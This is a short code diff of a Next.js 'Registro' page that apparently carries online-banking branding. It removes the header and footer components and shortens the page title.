@@ -1,5 +1,3 @@
-import Footer from "../components/Footer";
-import Header from "../components/Header";
 import Head from "next/head";
 import firebase from "../components/firebase";
 import { useState } from "react";
@@ -47,10 +45,9 @@ export default function Registro() {
   return (
     <div className="overflow-x-hidden">
       <Head>
-        <title>Registro | ACH Banca en línea</title>
+        <title>Registro</title>
         <link rel="icon" href="/lafise.webp" />
       </Head>
-      <Header />
       <div className="lg:w-6/12 mx-auto my-10 space-y-5">
         <img src="/banner6.webp" className="w-44 mx-auto" />
         <p className="text-lg font-medium w-10/12 lg:w-8/12 mx-auto text-center">
@@ -115,7 +112,6 @@ export default function Registro() {
         </div>
       </div>
       <img src="/banner7.webp" className="w-44 mx-auto mb-10" />
-      <Footer />
     </div>
   );
 }
